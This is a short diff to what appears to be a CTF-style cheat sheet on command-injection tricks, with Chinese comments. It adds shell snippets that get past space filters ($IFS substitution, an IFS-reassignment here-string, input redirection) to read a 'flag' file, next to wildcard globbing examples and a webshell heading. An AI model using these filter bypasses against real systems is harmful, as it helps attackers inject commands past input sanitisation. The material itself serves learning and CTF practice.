@@ -33,8 +33,11 @@ cat ./???sword
 // match multiple character
 cat f*
 
-// bypass space 
+// 繞過空白字元限制 
 cat${IFS}flag
+cat$IFSflag
+IFS=,;`cat<<<cat,flag`    // 將,指定為分割符，將 cat,flag 作為輸入提供給 cat
+cat<flag          // 使cmd從file讀入
 ```
    
 # Webshell cheatsheet
